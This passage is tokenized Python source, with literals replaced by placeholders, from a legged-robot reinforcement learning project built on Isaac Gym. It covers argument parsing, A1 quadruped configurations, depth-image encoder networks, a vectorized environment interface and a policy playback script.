'<STR_LIT>' ) <EOL> physics_group = parser . add_mutually_exclusive_group ( ) <EOL> physics_group . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , help = '<STR_LIT>' ) <EOL> physics_group . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , help = '<STR_LIT>' ) <EOL> parser . add_argument ( '<STR_LIT>' , type = int , default = <NUM_LIT> , help = '<STR_LIT>' ) <EOL> parser . add_argument ( '<STR_LIT>' , type = int , default = <NUM_LIT> , help = '<STR_LIT>' ) <EOL> parser . add_argument ( '<STR_LIT>' , type = int , help = '<STR_LIT>' ) <EOL> for argument in custom_parameters : <EOL> if ( "<STR_LIT>" in argument ) and ( "<STR_LIT>" in argument or "<STR_LIT>" in argument ) : <EOL> help_str = "<STR_LIT>" <EOL> if "<STR_LIT>" in argument : <EOL> help_str = argument [ "<STR_LIT>" ] <EOL> if "<STR_LIT>" in argument : <EOL> if "<STR_LIT>" in argument : <EOL> parser . add_argument ( argument [ "<STR_LIT>" ] , type = argument [ "<STR_LIT>" ] , default = argument [ "<STR_LIT>" ] , help = help_str ) <EOL> else : <EOL> parser . add_argument ( argument [ "<STR_LIT>" ] , type = argument [ "<STR_LIT>" ] , help = help_str ) <EOL> elif "<STR_LIT>" in argument : <EOL> parser . add_argument ( argument [ "<STR_LIT>" ] , action = argument [ "<STR_LIT>" ] , help = help_str ) <EOL> else : <EOL> print ( ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( ) <EOL> args = parser . parse_args ( ) <EOL> if args . device is not None : <EOL> args . sim_device = args . device <EOL> args . rl_device = args . device <EOL> args . sim_device_type , args . compute_device_id = parse_device_str ( args . sim_device ) <EOL> pipeline = args . pipeline . lower ( ) <EOL> assert ( pipeline == '<STR_LIT>' or pipeline in ( '<STR_LIT>' , '<STR_LIT>' ) ) , f"<STR_LIT>" <EOL> args . use_gpu_pipeline = ( pipeline in ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> if args . sim_device_type != '<STR_LIT>' and args . flex : <EOL> print ( "<STR_LIT>" ) <EOL> args . sim_device = '<STR_LIT>' <EOL> args . sim_device_type , args . compute_device_id = parse_device_str ( args . sim_device ) <EOL> if ( args . sim_device_type != '<STR_LIT>' and pipeline == '<STR_LIT>' ) : <EOL> print ( "<STR_LIT>" ) <EOL> args . pipeline = '<STR_LIT>' <EOL> args . use_gpu_pipeline = False <EOL> args . physics_engine = gymapi . SIM_PHYSX <EOL> args . use_gpu = ( args . sim_device_type == '<STR_LIT>' ) <EOL> if args . flex : <EOL> args . physics_engine = gymapi . SIM_FLEX <EOL> if no_graphics and args . nographics : <EOL> args . headless = True <EOL> if args . slices is None : <EOL> args . slices = args . subscenes <EOL> return args <EOL> </s>
<s> from . ppo import PPO <EOL> </s>
<s> from . on_policy_runner import OnPolicyRunner <EOL> </s>
<s> from legged_gym . envs . base . legged_robot_config import LeggedRobotCfg , LeggedRobotCfgPPO <EOL> class A1RoughCfg ( LeggedRobotCfg ) : <EOL> class init_state ( LeggedRobotCfg . init_state ) : <EOL> pos = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> default_joint_angles = { <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> } <EOL> class init_state_slope ( LeggedRobotCfg . init_state ) : <EOL> pos = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> default_joint_angles = { <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> } <EOL> class control ( LeggedRobotCfg . control ) : <EOL> control_type = '<STR_LIT>' <EOL> stiffness = { '<STR_LIT>' : <NUM_LIT> } <EOL> damping = { '<STR_LIT>' : <NUM_LIT> } <EOL> action_scale = <NUM_LIT> <EOL> decimation = <NUM_LIT> <EOL> class asset ( LeggedRobotCfg . asset ) : <EOL> file = '<STR_LIT>' <EOL> foot_name = "<STR_LIT>" <EOL> penalize_contacts_on = [ "<STR_LIT>" , "<STR_LIT>" ] <EOL> terminate_after_contacts_on = [ "<STR_LIT>" ] <EOL> self_collisions = <NUM_LIT> <EOL> class rewards ( LeggedRobotCfg . rewards ) : <EOL> soft_dof_pos_limit = <NUM_LIT> <EOL> base_height_target = <NUM_LIT> <EOL> class A1RoughCfgPPO ( LeggedRobotCfgPPO ) : <EOL> class algorithm ( LeggedRobotCfgPPO . algorithm ) : <EOL> entropy_coef = <NUM_LIT> <EOL> class runner ( LeggedRobotCfgPPO . runner ) : <EOL> run_name = '<STR_LIT>' <EOL> experiment_name = '<STR_LIT>' <EOL> </s>
<s> import torch <EOL> import torch . nn as nn <EOL> import sys <EOL> import torchvision <EOL> class RecurrentDepthBackbone ( nn . Module ) : <EOL> def __init__ ( self , base_backbone , env_cfg ) -> None : <EOL> super ( ) . __init__ ( ) <EOL> activation = nn . ELU ( ) <EOL> last_activation = nn . Tanh ( ) <EOL> self . base_backbone = base_backbone <EOL> if env_cfg == None : <EOL> self . combination_mlp = nn . Sequential ( <EOL> nn . Linear ( <NUM_LIT> + <NUM_LIT> , <NUM_LIT> ) , <EOL> activation , <EOL> nn . Linear ( <NUM_LIT> , <NUM_LIT> ) <EOL> ) <EOL> else : <EOL> self . combination_mlp = nn . Sequential ( <EOL> nn . Linear ( <NUM_LIT> + env_cfg . env . n_proprio , <NUM_LIT> ) , <EOL> activation , <EOL> nn . Linear ( <NUM_LIT> , <NUM_LIT> ) <EOL> ) <EOL> self . rnn = nn . GRU ( input_size = <NUM_LIT> , hidden_size = <NUM_LIT> , batch_first = True ) <EOL> self . output_mlp = nn . Sequential ( <EOL> nn . Linear ( <NUM_LIT> , <NUM_LIT> + <NUM_LIT> ) , <EOL> last_activation <EOL> ) <EOL> self . hidden_states = None <EOL> def forward ( self , depth_image , proprioception ) : <EOL> depth_image = self . base_backbone ( depth_image ) <EOL> depth_latent = self . combination_mlp ( torch . cat ( ( depth_image , proprioception ) , dim = - <NUM_LIT> ) ) <EOL> depth_latent , self . hidden_states = self . rnn ( depth_latent [ : , None , : ] , self . hidden_states ) <EOL> depth_latent = self . output_mlp ( depth_latent . squeeze ( <NUM_LIT> ) ) <EOL> return depth_latent <EOL> def detach_hidden_states ( self ) : <EOL> self . hidden_states = self . hidden_states . detach ( ) . clone ( ) <EOL> class StackDepthEncoder ( nn . Module ) : <EOL> def __init__ ( self , base_backbone , env_cfg ) -> None : <EOL> super ( ) . __init__ ( ) <EOL> activation = nn . ELU ( ) <EOL> self . base_backbone = base_backbone <EOL> self . combination_mlp = nn . Sequential ( <EOL> nn . Linear ( <NUM_LIT> + env_cfg . env . n_proprio , <NUM_LIT> ) , <EOL> activation , <EOL> nn . Linear ( <NUM_LIT> , <NUM_LIT> ) <EOL> ) <EOL> self . conv1d = nn . Sequential ( nn . Conv1d ( in_channels = env_cfg . depth . buffer_len , out_channels = <NUM_LIT> , kernel_size = <NUM_LIT> , stride = <NUM_LIT> ) , <EOL> activation , <EOL> nn . Conv1d ( in_channels = <NUM_LIT> , out_channels = <NUM_LIT> , kernel_size = <NUM_LIT> ) , <EOL> activation ) <EOL> self . mlp = nn . Sequential ( nn . Linear ( <NUM_LIT> * <NUM_LIT> , <NUM_LIT> ) , <EOL> activation ) <EOL> def forward ( self , depth_image , proprioception ) : <EOL> depth_latent = self . base_backbone ( None , depth_image . flatten ( <NUM_LIT> , <NUM_LIT> ) , None ) <EOL> depth_latent = depth_latent . reshape ( depth_image . shape [ <NUM_LIT> ] , depth_image . shape [ <NUM_LIT> ] , - <NUM_LIT> ) <EOL> depth_latent = self . conv1d ( depth_latent ) <EOL> depth_latent = self . mlp ( depth_latent . flatten ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> return depth_latent <EOL> class DepthOnlyFCBackbone58x87 ( nn . Module ) : <EOL> def __init__ ( self , prop_dim , scandots_output_dim , hidden_state_dim , output_activation = None , num_frames = <NUM_LIT> ) : <EOL> super ( ) . __init__ ( ) <EOL> self . num_frames = num_frames <EOL> activation = nn . ELU ( ) <EOL> self . image_compression = nn . Sequential ( <EOL> nn . Conv2d ( in_channels = self . num_frames , out_channels = <NUM_LIT> , kernel_size = <NUM_LIT> ) , <EOL> nn . MaxPool2d ( kernel_size = <NUM_LIT> , stride = <NUM_LIT> ) , <EOL> activation , <EOL> nn . Conv2d ( in_channels = <NUM_LIT> , out_channels = <NUM_LIT> , kernel_size = <NUM_LIT> ) , <EOL> activation , <EOL> nn . Flatten ( ) , <EOL> nn . Linear ( <NUM_LIT> * <NUM_LIT> * <NUM_LIT> , <NUM_LIT> ) , <EOL> activation , <EOL> nn . Linear ( <NUM_LIT> , scandots_output_dim ) <EOL> ) <EOL> if output_activation == "<STR_LIT>" : <EOL> self . output_activation = nn . Tanh ( ) <EOL> else : <EOL> self . output_activation = activation <EOL> def forward ( self , images : torch . Tensor ) : <EOL> images_compressed = self . image_compression ( images . unsqueeze ( <NUM_LIT> ) ) <EOL> latent = self . output_activation ( images_compressed ) <EOL> return latent <EOL> </s>
<s> from abc import ABC , abstractmethod <EOL> import torch <EOL> from typing import Tuple , Union <EOL> class VecEnv ( ABC ) : <EOL> num_envs : int <EOL> num_obs : int <EOL> num_privileged_obs : int <EOL> num_actions : int <EOL> max_episode_length : int <EOL> privileged_obs_buf : torch . Tensor <EOL> obs_buf : torch . Tensor <EOL> rew_buf : torch . Tensor <EOL> reset_buf : torch . Tensor <EOL> episode_length_buf : torch . Tensor <EOL> extras : dict <EOL> device : torch . device <EOL> @ abstractmethod <EOL> def step ( self , actions : torch . Tensor ) -> Tuple [ torch . Tensor , Union [ torch . Tensor , None ] , torch . Tensor , torch . Tensor , dict ] : <EOL> pass <EOL> @ abstractmethod <EOL> def reset ( self , env_ids : Union [ list , torch . Tensor ] ) : <EOL> pass <EOL> @ abstractmethod <EOL> def get_observations ( self ) -> torch . Tensor : <EOL> pass <EOL> @ abstractmethod <EOL> def get_privileged_observations ( self ) -> Union [ torch . Tensor , None ] : <EOL> pass <EOL> </s>
<s> from legged_gym import LEGGED_GYM_ROOT_DIR <EOL> import os <EOL> import code <EOL> import isaacgym <EOL> from legged_gym . envs import * <EOL> from legged_gym . utils import get_args , export_policy_as_jit , task_registry , Logger <EOL> from isaacgym import gymtorch , gymapi , gymutil <EOL> import numpy as np <EOL> import torch <EOL> import cv2 <EOL> from collections import deque <EOL> import statistics <EOL> import faulthandler <EOL> from copy import deepcopy <EOL> import matplotlib . pyplot as plt <EOL> from time import time , sleep <EOL> from legged_gym . utils import webviewer <EOL> def get_load_path ( root , load_run = - <NUM_LIT> , checkpoint = - <NUM_LIT> , model_name_include = "<STR_LIT>" ) : <EOL> if checkpoint == - <NUM_LIT> : <EOL> models = [ file for file in os . listdir ( root ) if model_name_include in file ] <EOL> models . sort ( key = lambda m : '<STR_LIT>' . format ( m ) ) <EOL> model = models [ - <NUM_LIT> ] <EOL> checkpoint = model . split ( "<STR_LIT>" ) [ - <NUM_LIT> ] . split ( "<STR_LIT>" ) [ <NUM_LIT> ] <EOL> return model , checkpoint <EOL> def play ( args ) : <EOL> if args . web : <EOL> web_viewer = webviewer . WebViewer ( ) <EOL> faulthandler . enable ( ) <EOL> exptid = args . exptid <EOL> log_pth = "<STR_LIT>" . format ( args . proj_name ) + args . exptid <EOL> env_cfg , train_cfg = task_registry . get_cfgs ( name = args . task ) <EOL> if args . nodelay : <EOL> env_cfg . domain_rand . action_delay_view = <NUM_LIT> <EOL> env_cfg . env . num_envs = <NUM_LIT> if not args . save else <NUM_LIT> <EOL> env_cfg . env . episode_length_s = <NUM_LIT> <EOL> env_cfg . commands . resampling_time = <NUM_LIT> <EOL> env_cfg . terrain . num_rows = <NUM_LIT> <EOL> env_cfg . terrain . num_cols = <NUM_LIT> <EOL> env_cfg . terrain . height = [ <NUM_LIT> , <NUM_LIT> ] <EOL> env_cfg . terrain . terrain_dict = { "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> } <EOL> env_cfg . terrain . terrain_proportions = list ( env_cfg . terrain . terrain_dict . values ( ) ) <EOL> env_cfg . terrain . curriculum = False <EOL> env_cfg . terrain . max_difficulty = True <EOL> env_cfg . depth . angle = [ <NUM_LIT> , <NUM_LIT> ] <EOL> env_cfg . noise . add_noise = True <EOL> env_cfg . domain_rand . randomize_friction = True <EOL> env_cfg . domain_rand . push_robots = False <EOL> env_cfg . domain_rand . push_interval_s = <NUM_LIT> <EOL> env_cfg . domain_rand . randomize_base_mass = False <EOL> env_cfg . domain_rand . randomize_base_com = False <EOL> depth_latent_buffer = [ ] <EOL> env : LeggedRobot <EOL> env , _ = task_registry . make_env ( name = args . task , args = args , env_cfg = env_cfg ) <EOL> obs = env . get_observations ( ) <EOL> if args . web : <EOL> web_viewer . setup ( env ) <EOL> train_cfg . runner . resume = True <EOL> ppo_runner , train_cfg , log_pth = task_registry . make_alg_runner ( log_root = log_pth , env = env , name = args . task , args = args , train_cfg = train_cfg , return_log_dir = True ) <EOL> if args . use_jit : <EOL> path = os . path . join ( log_pth , "<STR_LIT>" ) <EOL> model , checkpoint = get_load_path ( root = path , checkpoint = args . checkpoint ) <EOL> path = os . path . join ( path , model ) <EOL> print ( "<STR_LIT>" , path ) <EOL> policy_jit = torch . jit . load ( path , map_location = env . device ) <EOL> else : <EOL> policy = ppo_runner . get_inference_policy ( device = env . device ) <EOL> estimator = ppo_runner . get_estimator_inference_policy ( device = env . device ) <EOL> if env . cfg . depth . use_camera : <EOL> depth_encoder = ppo_runner . get_depth_encoder_inference_policy ( device = env . device ) <EOL> actions = torch . zeros ( env . num_envs , <NUM_LIT> , device = env . device , requires_grad = False ) <EOL> infos = { } <EOL> infos [ "<STR_LIT>" ] = env . depth_buffer . clone ( ) . to ( ppo_runner . device ) [ : , - <NUM_LIT> ] if ppo_runner . if_depth else None <EOL> for i in range ( <NUM_LIT> * int ( env . max_episode_length ) ) : <EOL> if args . use_jit : <EOL> if env . cfg . depth . use_camera : <EOL> if infos [ "<STR_LIT>" ] is not None : <EOL> depth_latent = torch . ones ( ( env_cfg . env . num_envs , <NUM_LIT> ) , device = env . device ) <EOL> actions , depth_latent = policy_jit ( obs . detach ( ) , True , infos [ "<STR_LIT>" ] , depth_latent ) <EOL> else : <EOL> depth_buffer = torch . ones ( ( env_cfg . env . num_envs , <NUM_LIT> , <NUM_LIT> ) , device = env . device ) <EOL> actions , depth_latent = policy_jit ( obs . detach ( ) , False , depth_buffer , depth_latent ) <EOL> else : <EOL> obs_jit = torch . cat ( ( obs . detach ( ) [ : , : env_cfg . env . n_proprio + env_cfg . env . n_priv ] , obs . detach ( ) [ : , - env_cfg . env . history_len * env_cfg . env . n_proprio : ] ) , dim = <NUM_LIT> ) <EOL> actions = policy ( obs_jit ) <EOL> else : <EOL> if env . cfg . depth . use_camera : <EOL> if infos [ "<STR_LIT>" ] is not None : <EOL> obs_student = obs [ : , : env . cfg . env . n_proprio ] . clone ( ) <EOL> obs_student [ : , <NUM_LIT> : <NUM_LIT> ] = <NUM_LIT> <EOL> depth_latent_and_yaw = depth_encoder ( infos [ "<STR_LIT>" ] , obs_student ) <EOL> depth_latent = depth_latent_and_yaw [ : , : - <NUM_LIT> ] <EOL> yaw = depth_latent_and_yaw [ : , - <NUM_LIT> : ] <EOL> obs [ : , <NUM_LIT> : <NUM_LIT> ] = <NUM_LIT> * yaw <EOL> else : <EOL> depth_latent = None <EOL> if hasattr ( ppo_runner . alg , "<STR_LIT>" ) : <EOL> actions = ppo_runner . alg . depth_actor ( obs . detach ( ) , hist_encoding = True , scandots_latent = depth_latent ) <EOL> else : <EOL> actions = policy ( obs . detach ( ) , hist_encoding = True , scandots_latent = depth_latent ) <EOL> obs , _ , rews , dones , infos = env . step ( actions . detach ( ) ) <EOL> if args . web : <EOL> web_viewer . render ( fetch_results = True , <EOL> step_graphics = True , <EOL> render_all_camera_sensors = True , <EOL> wait_for_page_load = True ) <EOL> print ( "<STR_LIT>" , env . episode_length_buf [ env . lookat_id ] . item ( ) / <NUM_LIT> , <EOL> "<STR_LIT>" , env . commands [ env . lookat_id , <NUM_LIT> ] . item ( ) , <EOL> "<STR_LIT>" , env . base_lin_vel [ env . lookat_id , <NUM_LIT> ] . item ( ) , ) <EOL> id = env . lookat_id <EOL> if __name__ == '<STR_LIT>' : <EOL> EXPORT_POLICY = False <EOL> RECORD_FRAMES = False <EOL> MOVE_CAMERA = False <EOL> args = get_args ( ) <EOL> play ( args ) <EOL> </s>
<s> from posixpath import relpath <EOL> from torch . nn . modules . activation import ReLU <EOL> from torch . nn . modules . pooling import MaxPool2d <EOL> from . base_config import BaseConfig <EOL> import torch . nn as nn <EOL> class LeggedRobotCfg ( BaseConfig ) : <EOL> class play : <EOL> load_student_config = False <EOL> mask_priv_obs = False <EOL> class env : <EOL> num_envs = <NUM_LIT> <EOL> n_scan = <NUM_LIT> <EOL> n_priv = <NUM_LIT> + <NUM_LIT> + <NUM_LIT> <EOL> n_priv_latent = <NUM_LIT> + <NUM_LIT> + <NUM_LIT> + <NUM_LIT> <EOL> n_proprio = <NUM_LIT> + <NUM_LIT> + <NUM_LIT> + <NUM_LIT> + <NUM_LIT> + <NUM_LIT> <EOL> history_len = <NUM_LIT> <EOL> num_observations = n_proprio + n_scan + history_len * n_proprio + n_priv_latent + n_priv <EOL> num_privileged_obs = None <EOL> num_actions = <NUM_LIT> <EOL> env_spacing = <NUM_LIT> <EOL> send_timeouts = True <EOL> episode_length_s = <NUM_LIT> <EOL> obs_type = "<STR_LIT>" <EOL> history_encoding = True <EOL> reorder_dofs = True <EOL> include_foot_contacts = True <EOL> randomize_start_pos = False <EOL> randomize_start_vel = False <EOL> randomize_start_yaw = False <EOL> rand_yaw_range = <NUM_LIT> <EOL> randomize_start_y = False <EOL> rand_y_range = <NUM_LIT> <EOL> randomize_start_pitch = False <EOL> rand_pitch_range = <NUM_LIT> <EOL> contact_buf_len = <NUM_LIT> <EOL> next_goal_threshold = <NUM_LIT> <EOL> reach_goal_delay = <NUM_LIT> <EOL> num_future_goal_obs = <NUM_LIT> <EOL> class depth : <EOL> use_camera = False <EOL> camera_num_envs = <NUM_LIT> <EOL> camera_terrain_num_rows = <NUM_LIT> <EOL> camera_terrain_num_cols = <NUM_LIT> <EOL> position = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> angle = [ - <NUM_LIT> , <NUM_LIT> ] <EOL> update_interval = <NUM_LIT> <EOL> original = ( <NUM_LIT> , <NUM_LIT> ) <EOL> resized = ( <NUM_LIT> , <NUM_LIT> ) <EOL> horizontal_fov = <NUM_LIT> <EOL> buffer_len = <NUM_LIT> <EOL> near_clip = <NUM_LIT> <EOL> far_clip = <NUM_LIT> <EOL> dis_noise = <NUM_LIT> <EOL> scale = <NUM_LIT> <EOL> invert = True <EOL> class normalization : <EOL> class obs_scales : <EOL> lin_vel = <NUM_LIT> <EOL> ang_vel = <NUM_LIT> <EOL> dof_pos = <NUM_LIT> <EOL> dof_vel = <NUM_LIT> <EOL> height_measurements = <NUM_LIT> <EOL> clip_observations = <NUM_LIT> <EOL> clip_actions = <NUM_LIT> <EOL> class noise : <EOL> add_noise = False <EOL> noise_level = <NUM_LIT> <EOL> quantize_height = True <EOL> class noise_scales : <EOL> rotation = <NUM_LIT> <EOL> dof_pos = <NUM_LIT> <EOL> dof_vel = <NUM_LIT> <EOL> lin_vel = <NUM_LIT> <EOL> ang_vel = <NUM_LIT> <EOL> gravity = <NUM_LIT> <EOL> height_measurements = <NUM_LIT> <EOL> class terrain : <EOL> mesh_type = '<STR_LIT>' <EOL> hf2mesh_method = "<STR_LIT>" <EOL> max_error = <NUM_LIT> <EOL> max_error_camera = <NUM_LIT> <EOL> y_range = [ - <NUM_LIT> , <NUM_LIT> ] <EOL> edge_width_thresh = <NUM_LIT> <EOL> horizontal_scale = <NUM_LIT> <EOL> horizontal_scale_camera = <NUM_LIT> <EOL> vertical_scale = <NUM_LIT> <EOL> border_size = <NUM_LIT> <EOL> height = [ <NUM_LIT> , <NUM_LIT> ] <EOL> simplify_grid = False <EOL> gap_size = [ <NUM_LIT> , <NUM_LIT> ] <EOL> stepping_stone_distance = [ <NUM_LIT> , <NUM_LIT> ] <EOL> downsampled_scale = <NUM_LIT> <EOL> curriculum = True <EOL> all_vertical = False <EOL> no_flat = True <EOL> static_friction = <NUM_LIT> <EOL> dynamic_friction = <NUM_LIT> <EOL> restitution = <NUM_LIT> <EOL> measure_heights = True <EOL> measured_points_x = [ - <NUM_LIT> , - <NUM_LIT> , - <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> measured_points_y = [ - <NUM_LIT> , - <NUM_LIT> , - <NUM_LIT> , - <NUM_LIT> , - <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> measure_horizontal_noise = <NUM_LIT> <EOL> selected = False <EOL> terrain_kwargs = None <EOL> max_init_terrain_level = <NUM_LIT> <EOL> terrain_length = <NUM_LIT> <EOL> terrain_width = <NUM_LIT> <EOL> num_rows = <NUM_LIT> <EOL> num_cols = <NUM_LIT> <EOL> terrain_dict = { "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , } <EOL> terrain_proportions = list ( terrain_dict . values ( ) ) <EOL> slope_treshold = <NUM_LIT> <EOL> origin_zero_z = True <EOL> num_goals = <NUM_LIT> <EOL> class commands : <EOL> curriculum = False <EOL> max_curriculum = <NUM_LIT> <EOL> num_commands = <NUM_LIT> <EOL> resampling_time = <NUM_LIT> <EOL> heading_command = True <EOL> lin_vel_clip = <NUM_LIT> <EOL> ang_vel_clip = <NUM_LIT> <EOL> class ranges : <EOL> lin_vel_x = [ <NUM_LIT> , <NUM_LIT> ] <EOL> lin_vel_y = [ <NUM_LIT> , <NUM_LIT> ] <EOL> ang_vel_yaw = [ <NUM_LIT> , <NUM_LIT> ] <EOL> heading = [ <NUM_LIT> , <NUM_LIT> ] <EOL> class max_ranges : <EOL> lin_vel_x = [ <NUM_LIT> , <NUM_LIT> ] <EOL> lin_vel_y = [ - <NUM_LIT> , <NUM_LIT> ] <EOL> ang_vel_yaw = [ - <NUM_LIT> , <NUM_LIT> ] <EOL> heading = [ - <NUM_LIT> , <NUM_LIT> ] <EOL> class crclm_incremnt : <EOL> lin_vel_x = <NUM_LIT> <EOL> lin_vel_y = <NUM_LIT> <EOL> ang_vel_yaw = <NUM_LIT> <EOL> heading = <NUM_LIT> <EOL> waypoint_delta = <NUM_LIT> <EOL> class init_state : <EOL> pos = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> rot = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> lin_vel = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> ang_vel = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> default_joint_angles = { <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> } <EOL> class control : <EOL> control_type = '<STR_LIT>' <EOL> stiffness = { '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> } <EOL> damping = { '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> } <EOL> action_scale = <NUM_LIT> <EOL> decimation = <NUM_LIT> <EOL> class asset : <EOL> file = "<STR_LIT>" <EOL> foot_name = "<STR_LIT>" <EOL> penalize_contacts_on = [ ] <EOL> terminate_after_contacts_on = [ ] <EOL> disable_gravity = False <EOL> collapse_fixed_joints = True <EOL> fix_base_link = False <EOL> default_dof_drive_mode = <NUM_LIT> <EOL> self_collisions = <NUM_LIT> <EOL> replace_cylinder_with_capsule = True <EOL> flip_visual_attachments = True <EOL> density = <NUM_LIT> <EOL> angular_damping = <NUM_LIT> <EOL> linear_damping = <NUM_LIT> <EOL> max_angular_velocity = <NUM_LIT> <EOL> max_linear_velocity = <NUM_LIT> <EOL> armature = <NUM_LIT> <EOL> thickness = <NUM_LIT> <EOL> class domain_rand : <EOL> randomize_friction = True <EOL> friction_range = [ <NUM_LIT> , <NUM_LIT> ] <EOL> randomize_base_mass = True <EOL> added_mass_range = [ <NUM_LIT> , <NUM_LIT> ] <EOL> randomize_base_com = True <EOL> added_com_range = [ - <NUM_LIT> , <NUM_LIT> ] <EOL> push_robots = True <EOL> push_interval_s = <NUM_LIT> <EOL> max_push_vel_xy = <NUM_LIT> <EOL> randomize_motor = True <EOL> motor_strength_range = [ <NUM_LIT> , <NUM_LIT> ] <EOL> delay_update_global_steps = <NUM_LIT> * <NUM_LIT> <EOL> action_delay = False <EOL> action_curr_step = [ <NUM_LIT> , <NUM_LIT> ] <EOL> action_curr_step_scratch = [ <NUM_LIT> , <NUM_LIT> ] <EOL> action_delay_view = <NUM_LIT> <EOL> action_buf_len = <NUM_LIT> <EOL> class rewards : <EOL> class scales : <EOL> tracking_goal_vel = <NUM_LIT> <EOL> tracking_yaw = <NUM_LIT> <EOL> lin_vel_z = - <NUM_LIT> <EOL> ang_vel_xy = - <NUM_LIT> <EOL> orientation = - <NUM_LIT> <EOL> dof_acc = - <NUM_LIT> <EOL> collision = - <NUM_LIT> <EOL> action_rate = - <NUM_LIT> <EOL> delta_torques = - <NUM_LIT> <EOL> torques = - <NUM_LIT> <EOL> hip_pos = - <NUM_LIT> <EOL> dof_error = - <NUM_LIT> <EOL> feet_stumble = - <NUM_LIT> <EOL> feet_edge = - <NUM_LIT> <EOL> only_positive_rewards = True <EOL> tracking_sigma = <NUM_LIT> <EOL> soft_dof_pos_limit = <NUM_LIT> <EOL> soft_dof_vel_limit = <NUM_LIT> <EOL> soft_torque_limit = <NUM_LIT> <EOL> base_height_target = <NUM_LIT> <EOL> max_contact_force = <NUM_LIT> <EOL> class viewer : <EOL> ref_env = <NUM_LIT> <EOL> pos = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> lookat = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> class sim : <EOL> dt = <NUM_LIT> <EOL> substeps = <NUM_LIT> <EOL> gravity = [ <NUM_LIT> , <NUM_LIT> , - <NUM_LIT> ] <EOL> up_axis = <NUM_LIT> <EOL> class physx : <EOL> num_threads = <NUM_LIT> <EOL> solver_type = <NUM_LIT> <EOL> num_position_iterations = <NUM_LIT> <EOL> num_velocity_iterations = <NUM_LIT> <EOL> contact_offset = <NUM_LIT> <EOL> rest_offset = <NUM_LIT> <EOL> bounce_threshold_velocity = <NUM_LIT> <EOL> 